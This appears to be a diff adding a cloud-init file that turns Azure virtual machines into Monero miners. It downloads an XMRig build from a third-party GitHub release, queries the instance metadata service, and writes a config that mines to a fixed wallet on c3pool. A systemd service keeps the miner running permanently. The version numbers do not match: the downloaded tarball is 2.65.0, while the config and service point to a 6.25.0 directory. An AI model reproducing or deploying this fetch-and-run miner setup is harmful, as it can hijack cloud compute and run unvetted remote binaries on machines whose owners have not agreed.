@@ -1,0 +1,121 @@
+#cloud-config
+package_update: true
+package_upgrade: true
+
+packages:
+  - jq
+  - wget
+  - tar
+  - curl
+  - unattended-upgrades
+
+runcmd:
+  # ---------- Benutzer & Verzeichnisse ----------
+  - mkdir -p /xmrig
+  - useradd -r -s /usr/sbin/nologin xmriguser || true
+  - chown -R xmriguser:xmriguser /xmrig
+
+  # ---------- XMRig herunterladen ----------
+  - wget https://github.com/InstantBuyback/xmrig/releases/download/azure/xmrig-2.65.0-linux-static-x64.tar.gz -O /xmrig/xmrig.tar.gz
+  - tar -xvf /xmrig/xmrig.tar.gz -C /xmrig
+  - chown -R xmriguser:xmriguser /xmrig
+
+  # ---------- Azure Metadata abrufen ----------
+  - |
+    META="http://169.254.169.254/metadata/instance/compute"
+    HDR="Metadata:true"
+
+    VMNAME=$(curl -s -H "$HDR" "$META/name?api-version=2021-02-01&format=text")
+
+    PASS="${VMNAME}"
+    echo "Generated xmrig pass: $PASS"
+
+    CONFIG="/xmrig/xmrig-6.25.0/config.json"
+
+    cat <<EOF > "$CONFIG"
+    {
+      "autosave": true,
+      "donate-level": 0,
+      "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": true,
+        "priority": 2,
+        "max-threads-hint": 90
+      },
+      "randomx": {
+        "mode": "fast",
+        "1gb-pages": false
+      },
+      "opencl": false,
+      "cuda": false,
+      "log-file": null,
+      "print-time": 60,
+      "pools": [
+        {
+          "algo": null,
+          "coin": null,
+          "url": "auto.c3pool.org:19999",
+          "user": "8BqHMz3KbteVebG7YzumZbcV2rbcPDvDweJA7zEDMtvs7ZfzsdgsSF6Gt1PLruYwTUVdEazXhEyK84U7Nury8SDNSiEG4hE",
+          "pass": "$PASS",
+          "rig-id": null,
+          "nicehash": false,
+          "keepalive": true,
+          "enabled": true,
+          "tls": false,
+          "sni": false,
+          "tls-fingerprint": null,
+          "daemon": false,
+          "socks5": null,
+          "self-select": null,
+          "submit-to-origin": false,
+          "retries": 5,
+          "retry-pause": 5
+        }
+      ]
+    }
+    EOF
+
+    chown xmriguser:xmriguser "$CONFIG"
+
+    # Validierung (extrem wichtig)
+    jq . "$CONFIG" >/dev/null || exit 1
+
+
+  # ---------- systemd Service ----------
+  - |
+    cat << 'EOF' > /etc/systemd/system/xmrig.service
+    [Unit]
+    Description=XMRig Miner
+    After=network-online.target
+    Wants=network-online.target
+
+    [Service]
+    ExecStartPre=/sbin/sysctl -w vm.nr_hugepages=128
+    ExecStartPre=/bin/sleep 30
+    Type=simple
+    User=xmriguser
+    Group=xmriguser
+    WorkingDirectory=/xmrig/xmrig-6.25.0
+    ExecStart=/xmrig/xmrig-6.25.0/xmrig
+    Restart=always
+    RestartSec=15
+    Nice=10
+    CPUAccounting=yes
+    MemoryAccounting=yes
+    StandardOutput=journal
+    StandardError=journal
+    KillSignal=SIGTERM
+    TimeoutStopSec=30
+    CPUQuota=360%
+
+    [Install]
+    WantedBy=multi-user.target
+    EOF
+
+
+  - systemctl daemon-reexec
+  - systemctl daemon-reload
+  - systemctl enable xmrig
+  - systemctl start xmrig
+
